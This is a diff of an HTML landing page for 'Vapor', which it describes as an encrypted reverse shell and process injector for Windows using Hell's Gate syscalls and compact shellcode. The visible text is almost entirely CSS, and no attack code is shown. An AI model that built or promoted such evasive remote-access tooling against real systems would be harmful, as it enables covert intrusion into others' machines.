@@ -1,1401 +1,845 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Vapor — ChaCha20-Poly1305 Reverse Shell</title>
-  <meta name="description" content="x86_64 NASM assembly encrypted reverse shell for Windows with ChaCha20-Poly1305 AEAD. ~3.6 KB shellcode. Hell's Gate injector. Zero imports. Full AEAD.">
-  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Ctext y='26' font-size='26'%3E%F0%9F%8C%AB%3C/text%3E%3C/svg%3E">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,300;0,400;0,500;0,600;0,700;1,400&display=swap" rel="stylesheet">
-  <style>
-    /* =========================================================
-       VAPOR LANDING PAGE
-       Catppuccin Mocha palette — dark terminal aesthetic
-       ========================================================= */
-
-    *, *::before, *::after {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    :root {
-      --ctp-rosewater: #f5e0dc;
-      --ctp-flamingo: #f2cdcd;
-      --ctp-pink: #f5c2e7;
-      --ctp-mauve: #cba6f7;
-      --ctp-red: #f38ba8;
-      --ctp-maroon: #eba0ac;
-      --ctp-peach: #fab387;
-      --ctp-yellow: #f9e2af;
-      --ctp-green: #a6e3a1;
-      --ctp-teal: #94e2d5;
-      --ctp-sky: #89dceb;
-      --ctp-sapphire: #74c7ec;
-      --ctp-blue: #89b4fa;
-      --ctp-lavender: #b4befe;
-      --ctp-text: #cdd6f4;
-      --ctp-subtext1: #bac2de;
-      --ctp-subtext0: #a6adc8;
-      --ctp-overlay2: #9399b2;
-      --ctp-overlay1: #7f849c;
-      --ctp-overlay0: #6c7086;
-      --ctp-surface2: #585b70;
-      --ctp-surface1: #45475a;
-      --ctp-surface0: #313244;
-      --ctp-base: #1e1e2e;
-      --ctp-mantle: #181825;
-      --ctp-crust: #11111b;
-    }
-
-    html {
-      scroll-behavior: smooth;
-      scrollbar-width: thin;
-      scrollbar-color: var(--ctp-surface1) var(--ctp-crust);
-    }
-
-    body {
-      font-family: 'JetBrains Mono', monospace;
-      background-color: var(--ctp-crust);
-      color: var(--ctp-text);
-      line-height: 1.7;
-      font-size: 15px;
-      overflow-x: hidden;
-      position: relative;
-    }
-
-    /* ---- Dot-grid background pattern ---- */
-    body::before {
-      content: '';
-      position: fixed;
-      inset: 0;
-      background-image: radial-gradient(var(--ctp-surface0) 1px, transparent 1px);
-      background-size: 24px 24px;
-      opacity: 0.3;
-      pointer-events: none;
-      z-index: 0;
-    }
-
-    /* ---- CRT scanline overlay ---- */
-    body::after {
-      content: '';
-      position: fixed;
-      inset: 0;
-      background: repeating-linear-gradient(
-        0deg,
-        transparent,
-        transparent 2px,
-        rgba(0, 0, 0, 0.03) 2px,
-        rgba(0, 0, 0, 0.03) 4px
-      );
-      pointer-events: none;
-      z-index: 9999;
-    }
-
-    /* ---- Layout ---- */
-    .page-wrap {
-      position: relative;
-      z-index: 1;
-      max-width: 1100px;
-      margin: 0 auto;
-      padding: 0 24px;
-    }
-
-    section {
-      margin-bottom: 96px;
-    }
-
-    a {
-      color: var(--ctp-sapphire);
-      text-decoration: none;
-      transition: color 0.2s;
-    }
-
-    a:hover {
-      color: var(--ctp-sky);
-    }
-
-    /* ---- Section titles ---- */
-    .section-label {
-      display: inline-block;
-      font-size: 11px;
-      font-weight: 600;
-      letter-spacing: 0.15em;
-      text-transform: uppercase;
-      color: var(--ctp-overlay0);
-      border: 1px solid var(--ctp-surface1);
-      padding: 4px 12px;
-      border-radius: 2px;
-      margin-bottom: 20px;
-    }
-
-    .section-title {
-      font-size: clamp(22px, 3vw, 30px);
-      font-weight: 700;
-      color: var(--ctp-text);
-      margin-bottom: 12px;
-      line-height: 1.3;
-    }
-
-    .section-desc {
-      color: var(--ctp-subtext0);
-      font-size: 14px;
-      max-width: 600px;
-      margin-bottom: 40px;
-    }
-
-    /* =========================================================
-       HERO
-       ========================================================= */
-    .hero {
-      padding: 80px 0 48px;
-      text-align: center;
-      margin-bottom: 64px;
-    }
-
-    .hero-terminal {
-      border: 1px solid var(--ctp-surface1);
-      border-radius: 8px;
-      background: var(--ctp-mantle);
-      max-width: 780px;
-      margin: 0 auto;
-      overflow: hidden;
-      box-shadow:
-        0 0 0 1px var(--ctp-surface0),
-        0 24px 80px -12px rgba(0, 0, 0, 0.6),
-        0 0 120px -40px rgba(148, 226, 213, 0.08);
-    }
-
-    .hero-titlebar {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      padding: 12px 16px;
-      background: var(--ctp-crust);
-      border-bottom: 1px solid var(--ctp-surface0);
-    }
-
-    .hero-dot {
-      width: 12px;
-      height: 12px;
-      border-radius: 50%;
-    }
-
-    .hero-dot--red    { background: var(--ctp-red); }
-    .hero-dot--yellow { background: var(--ctp-yellow); }
-    .hero-dot--green  { background: var(--ctp-green); }
-
-    .hero-titlebar-text {
-      flex: 1;
-      text-align: center;
-      font-size: 12px;
-      color: var(--ctp-overlay0);
-      letter-spacing: 0.05em;
-    }
-
-    .hero-body {
-      padding: 48px 40px 56px;
-    }
-
-    .hero-prompt {
-      font-size: 13px;
-      color: var(--ctp-overlay0);
-      margin-bottom: 24px;
-      letter-spacing: 0.02em;
-    }
-
-    .hero-prompt .prompt-symbol {
-      color: var(--ctp-green);
-    }
-
-    .hero-prompt .prompt-path {
-      color: var(--ctp-blue);
-    }
-
-    .hero-prompt .prompt-cmd {
-      color: var(--ctp-text);
-    }
-
-    .hero-prompt .prompt-flag {
-      color: var(--ctp-peach);
-    }
-
-    .hero-prompt .prompt-arg {
-      color: var(--ctp-yellow);
-    }
-
-    .hero-title {
-      font-size: clamp(42px, 7vw, 72px);
-      font-weight: 700;
-      letter-spacing: -0.03em;
-      line-height: 1.05;
-      margin-bottom: 8px;
-      background: linear-gradient(
-        135deg,
-        var(--ctp-teal) 0%,
-        var(--ctp-sapphire) 35%,
-        var(--ctp-blue) 65%,
-        var(--ctp-mauve) 100%
-      );
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-      filter: drop-shadow(0 0 40px rgba(148, 226, 213, 0.2));
-    }
-
-    .hero-cursor {
-      display: inline-block;
-      width: 3px;
-      height: 0.8em;
-      background: var(--ctp-teal);
-      margin-left: 4px;
-      vertical-align: baseline;
-      animation: blink 1s step-end infinite;
-    }
-
-    @keyframes blink {
-      0%, 100% { opacity: 1; }
-      50%       { opacity: 0; }
-    }
-
-    .hero-tagline {
-      font-size: clamp(14px, 2vw, 17px);
-      color: var(--ctp-subtext0);
-      margin-bottom: 36px;
-      font-weight: 400;
-      line-height: 1.6;
-    }
-
-    .hero-tagline em {
-      color: var(--ctp-subtext1);
-      font-style: normal;
-    }
-
-    .hero-stats {
-      display: flex;
-      justify-content: center;
-      gap: 32px;
-      margin-bottom: 36px;
-      flex-wrap: wrap;
-    }
-
-    .hero-stat {
-      text-align: center;
-    }
-
-    .hero-stat-value {
-      font-size: 28px;
-      font-weight: 700;
-      line-height: 1.2;
-    }
-
-    .hero-stat:nth-child(1) .hero-stat-value { color: var(--ctp-teal); }
-    .hero-stat:nth-child(2) .hero-stat-value { color: var(--ctp-blue); }
-    .hero-stat:nth-child(3) .hero-stat-value { color: var(--ctp-mauve); }
-    .hero-stat:nth-child(4) .hero-stat-value { color: var(--ctp-red); }
-
-    .hero-stat-label {
-      font-size: 11px;
-      color: var(--ctp-overlay1);
-      text-transform: uppercase;
-      letter-spacing: 0.1em;
-    }
-
-    .hero-buttons {
-      display: flex;
-      gap: 16px;
-      justify-content: center;
-      flex-wrap: wrap;
-    }
-
-    .btn {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      padding: 12px 28px;
-      border-radius: 4px;
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 14px;
-      font-weight: 500;
-      letter-spacing: 0.02em;
-      border: 1px solid transparent;
-      cursor: pointer;
-      transition: all 0.2s;
-      text-decoration: none;
-    }
-
-    .btn-primary {
-      background: var(--ctp-teal);
-      color: var(--ctp-crust);
-      border-color: var(--ctp-teal);
-    }
-
-    .btn-primary:hover {
-      background: var(--ctp-sky);
-      border-color: var(--ctp-sky);
-      color: var(--ctp-crust);
-      box-shadow: 0 0 24px rgba(148, 226, 213, 0.25);
-    }
-
-    .btn-ghost {
-      background: transparent;
-      color: var(--ctp-subtext1);
-      border-color: var(--ctp-surface1);
-    }
-
-    .btn-ghost:hover {
-      color: var(--ctp-text);
-      border-color: var(--ctp-overlay0);
-      background: var(--ctp-surface0);
-    }
-
-    /* =========================================================
-       FEATURES GRID
-       ========================================================= */
-    .features-grid {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 16px;
-    }
-
-    .feature-card {
-      background: var(--ctp-mantle);
-      border: 1px solid var(--ctp-surface0);
-      border-radius: 6px;
-      padding: 28px 24px;
-      transition: all 0.25s;
-      position: relative;
-      overflow: hidden;
-    }
-
-    .feature-card::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      height: 2px;
-      background: linear-gradient(90deg, transparent, var(--ctp-teal), transparent);
-      opacity: 0;
-      transition: opacity 0.3s;
-    }
-
-    .feature-card:hover {
-      border-color: var(--ctp-surface1);
-      background: var(--ctp-base);
-      transform: translateY(-2px);
-      box-shadow: 0 8px 32px -8px rgba(0, 0, 0, 0.4);
-    }
-
-    .feature-card:hover::before {
-      opacity: 1;
-    }
-
-    .feature-icon {
-      font-size: 24px;
-      margin-bottom: 16px;
-      display: block;
-      width: 44px;
-      height: 44px;
-      line-height: 44px;
-      text-align: center;
-      background: var(--ctp-surface0);
-      border-radius: 8px;
-      border: 1px solid var(--ctp-surface1);
-    }
-
-    .feature-card h3 {
-      font-size: 14px;
-      font-weight: 600;
-      color: var(--ctp-text);
-      margin-bottom: 8px;
-    }
-
-    .feature-card p {
-      font-size: 13px;
-      color: var(--ctp-subtext0);
-      line-height: 1.6;
-    }
-
-    .feature-card:nth-child(1):hover { border-color: var(--ctp-teal); }
-    .feature-card:nth-child(1):hover::before { background: linear-gradient(90deg, transparent, var(--ctp-teal), transparent); }
-
-    .feature-card:nth-child(2):hover { border-color: var(--ctp-sapphire); }
-    .feature-card:nth-child(2):hover::before { background: linear-gradient(90deg, transparent, var(--ctp-sapphire), transparent); }
-
-    .feature-card:nth-child(3):hover { border-color: var(--ctp-blue); }
-    .feature-card:nth-child(3):hover::before { background: linear-gradient(90deg, transparent, var(--ctp-blue), transparent); }
-
-    .feature-card:nth-child(4):hover { border-color: var(--ctp-mauve); }
-    .feature-card:nth-child(4):hover::before { background: linear-gradient(90deg, transparent, var(--ctp-mauve), transparent); }
-
-    .feature-card:nth-child(5):hover { border-color: var(--ctp-green); }
-    .feature-card:nth-child(5):hover::before { background: linear-gradient(90deg, transparent, var(--ctp-green), transparent); }
-
-    .feature-card:nth-child(6):hover { border-color: var(--ctp-peach); }
-    .feature-card:nth-child(6):hover::before { background: linear-gradient(90deg, transparent, var(--ctp-peach), transparent); }
-
-    .feature-card:nth-child(7):hover { border-color: var(--ctp-red); }
-    .feature-card:nth-child(7):hover::before { background: linear-gradient(90deg, transparent, var(--ctp-red), transparent); }
-
-    .feature-card:nth-child(8):hover { border-color: var(--ctp-maroon); }
-    .feature-card:nth-child(8):hover::before { background: linear-gradient(90deg, transparent, var(--ctp-maroon), transparent); }
-
-    /* =========================================================
-       ARCHITECTURE
-       ========================================================= */
-    .arch-terminal {
-      border: 1px solid var(--ctp-surface1);
-      border-radius: 8px;
-      overflow: hidden;
-      background: var(--ctp-mantle);
-      box-shadow: 0 16px 48px -12px rgba(0, 0, 0, 0.4);
-    }
-
-    .arch-titlebar {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      padding: 10px 16px;
-      background: var(--ctp-crust);
-      border-bottom: 1px solid var(--ctp-surface0);
-    }
-
-    .arch-titlebar-text {
-      flex: 1;
-      text-align: center;
-      font-size: 12px;
-      color: var(--ctp-overlay0);
-    }
-
-    .arch-body {
-      padding: 32px;
-    }
-
-    .arch-divider {
-      border: none;
-      border-top: 1px dashed var(--ctp-surface1);
-      margin: 28px 0;
-    }
-
-    /* ---- Data flow diagram ---- */
-    .flow-diagram {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 0;
-      margin-bottom: 0;
-      flex-wrap: nowrap;
-    }
-
-    .flow-node {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 6px;
-    }
-
-    .flow-node-box {
-      padding: 14px 24px;
-      border: 1px solid var(--ctp-surface1);
-      border-radius: 6px;
-      background: var(--ctp-base);
-      font-size: 14px;
-      font-weight: 600;
-      color: var(--ctp-teal);
-      white-space: nowrap;
-    }
-
-    .flow-node-label {
-      font-size: 11px;
-      color: var(--ctp-overlay1);
-      text-transform: uppercase;
-      letter-spacing: 0.08em;
-    }
-
-    .flow-arrows {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 6px;
-      padding: 0 16px;
-      flex-shrink: 0;
-    }
-
-    .flow-arrow {
-      display: flex;
-      align-items: center;
-      gap: 6px;
-      font-size: 11px;
-      color: var(--ctp-overlay1);
-      white-space: nowrap;
-    }
-
-    .flow-arrow-line {
-      width: 60px;
-      height: 1px;
-      background: var(--ctp-surface2);
-      position: relative;
-    }
-
-    .flow-arrow-line::after {
-      content: '';
-      position: absolute;
-      right: -1px;
-      top: -3px;
-      border: 3px solid transparent;
-      border-left: 5px solid var(--ctp-surface2);
-    }
-
-    .flow-arrow--left .flow-arrow-line::after {
-      right: auto;
-      left: -1px;
-      border-left: none;
-      border-right: 5px solid var(--ctp-surface2);
-    }
-
-    .flow-arrow-tag {
-      padding: 2px 8px;
-      border-radius: 3px;
-      background: var(--ctp-surface0);
-      font-size: 10px;
-      letter-spacing: 0.04em;
-    }
-
-    .flow-arrow-tag--tcp { color: var(--ctp-green); }
-    .flow-arrow-tag--enc { color: var(--ctp-mauve); }
-
-    /* ---- Wire format bar ---- */
-    .wire-bar-label {
-      font-size: 12px;
-      color: var(--ctp-overlay1);
-      font-weight: 500;
-      margin-bottom: 12px;
-      letter-spacing: 0.04em;
-    }
-
-    .wire-bar {
-      display: flex;
-      border-radius: 6px;
-      overflow: hidden;
-      border: 1px solid var(--ctp-surface1);
-      margin-bottom: 8px;
-    }
-
-    .wire-segment {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      padding: 14px 0;
-      gap: 4px;
-      border-right: 1px solid var(--ctp-surface1);
-    }
-
-    .wire-segment:last-child {
-      border-right: none;
-    }
-
-    .wire-segment-name {
-      font-size: 12px;
-      font-weight: 600;
-    }
-
-    .wire-segment-detail {
-      font-size: 10px;
-      opacity: 0.7;
-    }
-
-    .wire-seg--len {
-      flex: 1;
-      background: rgba(148, 226, 213, 0.08);
-      color: var(--ctp-teal);
-    }
-
-    .wire-seg--nonce {
-      flex: 1.5;
-      background: rgba(137, 180, 250, 0.08);
-      color: var(--ctp-blue);
-    }
-
-    .wire-seg--ct {
-      flex: 3;
-      background: rgba(249, 226, 175, 0.08);
-      color: var(--ctp-yellow);
-    }
-
-    .wire-seg--mac {
-      flex: 1.5;
-      background: rgba(203, 166, 247, 0.08);
-      color: var(--ctp-mauve);
-    }
-
-    /* =========================================================
-       INTERNALS / CAPABILITIES
-       ========================================================= */
-    .capabilities-section {
-      text-align: center;
-    }
-
-    .capabilities-terminal {
-      border: 1px solid var(--ctp-surface1);
-      border-radius: 8px;
-      overflow: hidden;
-      background: var(--ctp-mantle);
-      box-shadow:
-        0 0 0 1px var(--ctp-surface0),
-        0 32px 80px -16px rgba(0, 0, 0, 0.5),
-        0 0 160px -60px rgba(148, 226, 213, 0.06);
-      max-width: 1000px;
-      margin: 0 auto;
-    }
-
-    .capabilities-titlebar {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      padding: 10px 16px;
-      background: var(--ctp-crust);
-      border-bottom: 1px solid var(--ctp-surface0);
-    }
-
-    .capabilities-titlebar-text {
-      flex: 1;
-      text-align: center;
-      font-size: 12px;
-      color: var(--ctp-overlay0);
-    }
-
-    .capabilities-body {
-      padding: 32px;
-    }
-
-    .capabilities-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
-      gap: 10px;
-      margin-bottom: 24px;
-    }
-
-    .capability-pill {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      padding: 10px 14px;
-      border: 1px solid var(--ctp-surface0);
-      border-radius: 4px;
-      background: var(--ctp-base);
-      font-size: 13px;
-      color: var(--ctp-subtext1);
-      transition: all 0.2s;
-    }
-
-    .capability-pill:hover {
-      border-color: var(--ctp-surface2);
-      background: var(--ctp-surface0);
-    }
-
-    .capability-pill .dot {
-      width: 6px;
-      height: 6px;
-      border-radius: 50%;
-      flex-shrink: 0;
-    }
-
-    .dot--api     { background: var(--ctp-green); }
-    .dot--net     { background: var(--ctp-blue); }
-    .dot--chacha  { background: var(--ctp-teal); }
-    .dot--aead    { background: var(--ctp-mauve); }
-    .dot--exec    { background: var(--ctp-peach); }
-    .dot--inject  { background: var(--ctp-red); }
-
-    .capabilities-legend {
-      display: flex;
-      justify-content: center;
-      gap: 24px;
-      flex-wrap: wrap;
-      font-size: 12px;
-      color: var(--ctp-overlay1);
-    }
-
-    .capabilities-legend span {
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-    }
-
-    /* =========================================================
-       INJECTOR SECTION
-       ========================================================= */
-    .injector-flow {
-      border: 1px solid var(--ctp-surface1);
-      border-radius: 8px;
-      overflow: hidden;
-      background: var(--ctp-mantle);
-      box-shadow: 0 16px 48px -12px rgba(0, 0, 0, 0.4);
-      max-width: 1000px;
-      margin: 0 auto;
-    }
-
-    .injector-titlebar {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      padding: 10px 16px;
-      background: var(--ctp-crust);
-      border-bottom: 1px solid var(--ctp-surface0);
-    }
-
-    .injector-titlebar-text {
-      flex: 1;
-      text-align: center;
-      font-size: 12px;
-      color: var(--ctp-overlay0);
-    }
-
-    .injector-body {
-      padding: 32px;
-    }
-
-    .injector-steps {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 12px;
-      margin-bottom: 28px;
-    }
-
-    .injector-step {
-      display: flex;
-      align-items: flex-start;
-      gap: 12px;
-      padding: 14px 16px;
-      border: 1px solid var(--ctp-surface0);
-      border-radius: 4px;
-      background: var(--ctp-base);
-      transition: all 0.2s;
-    }
-
-    .injector-step:hover {
-      border-color: var(--ctp-surface2);
-      background: var(--ctp-surface0);
-    }
-
-    .step-num {
-      font-size: 11px;
-      font-weight: 700;
-      color: var(--ctp-crust);
-      background: var(--ctp-red);
-      width: 22px;
-      height: 22px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      flex-shrink: 0;
-      margin-top: 1px;
-    }
-
-    .step-content {
-      font-size: 13px;
-      color: var(--ctp-subtext1);
-      line-height: 1.5;
-    }
-
-    .step-content strong {
-      color: var(--ctp-text);
-      font-weight: 600;
-    }
-
-    .step-content .nt-fn {
-      color: var(--ctp-red);
-    }
-
-    .step-content .k32-fn {
-      color: var(--ctp-green);
-    }
-
-    .injector-techniques {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
-      gap: 10px;
-    }
-
-    .technique-pill {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      padding: 10px 14px;
-      border: 1px solid var(--ctp-surface0);
-      border-radius: 4px;
-      background: var(--ctp-base);
-      font-size: 13px;
-      color: var(--ctp-subtext1);
-      transition: all 0.2s;
-    }
-
-    .technique-pill:hover {
-      border-color: var(--ctp-surface2);
-      background: var(--ctp-surface0);
-    }
-
-    .technique-pill .t-dot {
-      width: 6px;
-      height: 6px;
-      border-radius: 50%;
-      flex-shrink: 0;
-      background: var(--ctp-red);
-    }
-
-    /* =========================================================
-       QUICK START
-       ========================================================= */
-    .start-terminal {
-      border: 1px solid var(--ctp-surface1);
-      border-radius: 8px;
-      overflow: hidden;
-      background: var(--ctp-mantle);
-      box-shadow: 0 16px 48px -12px rgba(0, 0, 0, 0.4);
-    }
-
-    .start-titlebar {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      padding: 10px 16px;
-      background: var(--ctp-crust);
-      border-bottom: 1px solid var(--ctp-surface0);
-    }
-
-    .start-titlebar-text {
-      flex: 1;
-      text-align: center;
-      font-size: 12px;
-      color: var(--ctp-overlay0);
-    }
-
-    .start-body {
-      padding: 28px 32px;
-    }
-
-    .start-line {
-      margin-bottom: 4px;
-      font-size: 14px;
-      line-height: 1.8;
-    }
-
-    .start-line .prompt {
-      color: var(--ctp-green);
-      user-select: none;
-    }
-
-    .start-line .cmd {
-      color: var(--ctp-text);
-    }
-
-    .start-line .comment {
-      color: var(--ctp-overlay0);
-    }
-
-    .start-line .flag {
-      color: var(--ctp-peach);
-    }
-
-    .start-line .arg {
-      color: var(--ctp-yellow);
-    }
-
-    .start-line .str {
-      color: var(--ctp-green);
-    }
-
-    .start-spacer {
-      height: 14px;
-    }
-
-    /* =========================================================
-       FOOTER
-       ========================================================= */
-    .site-footer {
-      border-top: 1px solid var(--ctp-surface0);
-      padding: 48px 0;
-      text-align: center;
-      margin-top: 32px;
-    }
-
-    .footer-tagline {
-      font-size: 16px;
-      font-weight: 600;
-      color: var(--ctp-subtext1);
-      margin-bottom: 8px;
-      letter-spacing: 0.02em;
-    }
-
-    .footer-sub {
-      font-size: 13px;
-      color: var(--ctp-overlay1);
-      margin-bottom: 28px;
-    }
-
-    .footer-links {
-      display: flex;
-      justify-content: center;
-      gap: 32px;
-      margin-bottom: 28px;
-      flex-wrap: wrap;
-    }
-
-    .footer-links a {
-      font-size: 13px;
-      color: var(--ctp-overlay1);
-      transition: color 0.2s;
-    }
-
-    .footer-links a:hover {
-      color: var(--ctp-teal);
-    }
-
-    .footer-copy {
-      font-size: 12px;
-      color: var(--ctp-overlay0);
-    }
-
-    /* =========================================================
-       RESPONSIVE
-       ========================================================= */
-    @media (max-width: 900px) {
-      .features-grid {
-        grid-template-columns: repeat(2, 1fr);
-      }
-      .hero-body {
-        padding: 36px 24px 44px;
-      }
-      .hero-stats {
-        gap: 24px;
-      }
-      .injector-steps {
-        grid-template-columns: 1fr;
-      }
-    }
-
-    @media (max-width: 600px) {
-      body {
-        font-size: 14px;
-      }
-      .page-wrap {
-        padding: 0 16px;
-      }
-      .features-grid {
-        grid-template-columns: 1fr;
-      }
-      .capabilities-grid {
-        grid-template-columns: repeat(2, 1fr);
-      }
-      .injector-techniques {
-        grid-template-columns: repeat(2, 1fr);
-      }
-      section {
-        margin-bottom: 64px;
-      }
-      .hero {
-        padding: 48px 0 32px;
-      }
-      .hero-body {
-        padding: 28px 20px 36px;
-      }
-      .hero-buttons {
-        flex-direction: column;
-        align-items: center;
-      }
-      .btn {
-        width: 100%;
-        max-width: 260px;
-        justify-content: center;
-      }
-      .arch-body {
-        padding: 20px;
-      }
-      .flow-diagram {
-        gap: 0;
-      }
-      .flow-node-box {
-        padding: 10px 16px;
-        font-size: 12px;
-      }
-      .flow-arrows {
-        padding: 0 10px;
-      }
-      .flow-arrow-line {
-        width: 36px;
-      }
-      .wire-segment-name {
-        font-size: 11px;
-      }
-      .wire-segment-detail {
-        font-size: 9px;
-      }
-      .start-body {
-        padding: 20px;
-      }
-      .start-line {
-        font-size: 12px;
-      }
-      .feature-card {
-        padding: 22px 20px;
-      }
-      .injector-body {
-        padding: 20px;
-      }
-    }
-
-    /* ---- Selection highlight ---- */
-    ::selection {
-      background: rgba(148, 226, 213, 0.25);
-      color: var(--ctp-text);
-    }
-
-    /* ---- Focus styles for accessibility ---- */
-    a:focus-visible,
-    .btn:focus-visible {
-      outline: 2px solid var(--ctp-teal);
-      outline-offset: 2px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vapor — ChaCha20-Poly1305 Encrypted Reverse Shell + Process Injector</title>
+    <meta name="description" content="ChaCha20-Poly1305 encrypted reverse shell and process injector in pure x86_64 NASM assembly. Hell's Gate syscalls, zero dependencies, ~3.6 KB shellcode.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --red: #f38ba8;
+            --maroon: #eba0ac;
+            --pink: #f5c2e7;
+            --mauve: #cba6f7;
+            --lavender: #b4befe;
+            --blue: #89b4fa;
+            --sapphire: #74c7ec;
+            --sky: #89dceb;
+            --teal: #94e2d5;
+            --green: #a6e3a1;
+            --yellow: #f9e2af;
+            --peach: #fab387;
+            --text: #cdd6f4;
+            --subtext1: #bac2de;
+            --subtext0: #a6adc8;
+            --overlay2: #9399b2;
+            --overlay1: #7f849c;
+            --overlay0: #6c7086;
+            --surface2: #585b70;
+            --surface1: #45475a;
+            --surface0: #313244;
+            --base: #1e1e2e;
+            --mantle: #181825;
+            --crust: #11111b;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: var(--base);
+            color: var(--text);
+            line-height: 1.7;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background-image: radial-gradient(circle, var(--overlay0) 1px, transparent 1px);
+            background-size: 24px 24px;
+            opacity: 0.15;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background: repeating-linear-gradient(0deg, rgba(0,0,0,0.1), rgba(0,0,0,0.1) 1px, transparent 1px, transparent 2px);
+            pointer-events: none;
+            z-index: 999;
+            opacity: 0.4;
+        }
+
+        ::selection { background: rgba(243, 139, 168, 0.3); color: var(--text); }
+
+        code {
+            font-family: 'JetBrains Mono', monospace;
+            background: var(--mantle);
+            padding: 2px 7px;
+            border-radius: 3px;
+            font-size: 0.88em;
+            color: var(--green);
+        }
+
+        .container { max-width: 1140px; margin: 0 auto; padding: 0 28px; }
+
+        /* ── Hero ── */
+        .hero {
+            padding: 100px 0 70px;
+            text-align: center;
+            position: relative;
+        }
+
+        .hero::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 10%;
+            right: 10%;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--surface1), transparent);
+        }
+
+        .hero-logo {
+            max-width: 440px;
+            margin: 0 auto 32px;
+        }
+
+        .hero-logo img { width: 100%; height: auto; }
+
+        .hero .subtitle {
+            font-size: clamp(15px, 2vw, 18px);
+            color: var(--subtext0);
+            max-width: 680px;
+            margin: 0 auto 28px;
+            line-height: 1.7;
+        }
+
+        .hero .warning {
+            background: rgba(243, 139, 168, 0.07);
+            border: 1px solid rgba(243, 139, 168, 0.3);
+            border-radius: 6px;
+            padding: 14px 24px;
+            margin: 28px auto;
+            max-width: 720px;
+            font-size: 13px;
+            line-height: 1.6;
+            color: var(--subtext1);
+        }
+
+        .hero .warning strong { color: var(--red); }
+
+        /* ── Stats ── */
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 16px;
+            margin: 48px 0;
+        }
+
+        .stat {
+            background: var(--surface0);
+            border: 1px solid var(--surface1);
+            border-radius: 8px;
+            padding: 20px 16px;
+            text-align: center;
+            transition: transform 0.2s, border-color 0.2s;
+        }
+
+        .stat:hover { transform: translateY(-2px); border-color: var(--surface2); }
+
+        .stat-value {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 28px;
+            font-weight: 700;
+            color: var(--red);
+            line-height: 1;
+        }
+
+        .stat-label { font-size: 12px; color: var(--overlay1); margin-top: 6px; letter-spacing: 0.03em; }
+
+        /* ── CTAs ── */
+        .cta-group { display: flex; gap: 14px; justify-content: center; margin-top: 36px; }
+
+        .btn {
+            padding: 13px 32px;
+            border-radius: 6px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            font-weight: 600;
+            text-decoration: none;
+            letter-spacing: 0.03em;
+            transition: all 0.2s;
+            display: inline-block;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--red), var(--maroon));
+            color: var(--crust);
+        }
+
+        .btn-primary:hover {
+            box-shadow: 0 0 24px rgba(243, 139, 168, 0.35);
+            transform: translateY(-2px);
+        }
+
+        .btn-secondary {
+            background: var(--surface0);
+            color: var(--text);
+            border: 1px solid var(--surface1);
+        }
+
+        .btn-secondary:hover { background: var(--surface1); border-color: var(--surface2); }
+
+        .btn-ghost {
+            background: transparent;
+            color: var(--subtext1);
+            border: 1px solid var(--surface1);
+        }
+
+        .btn-ghost:hover { background: var(--surface0); color: var(--text); }
+
+        /* ── Sections ── */
+        section { padding: 72px 0; }
+
+        section h2 {
+            font-size: clamp(28px, 4vw, 42px);
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: var(--text);
+            letter-spacing: -0.02em;
+        }
+
+        section .section-desc {
+            font-size: 15px;
+            color: var(--subtext0);
+            margin-bottom: 44px;
+            max-width: 640px;
+            line-height: 1.7;
+        }
+
+        /* ── Feature Grid ── */
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 20px;
+        }
+
+        .feature {
+            background: var(--surface0);
+            border: 1px solid var(--surface1);
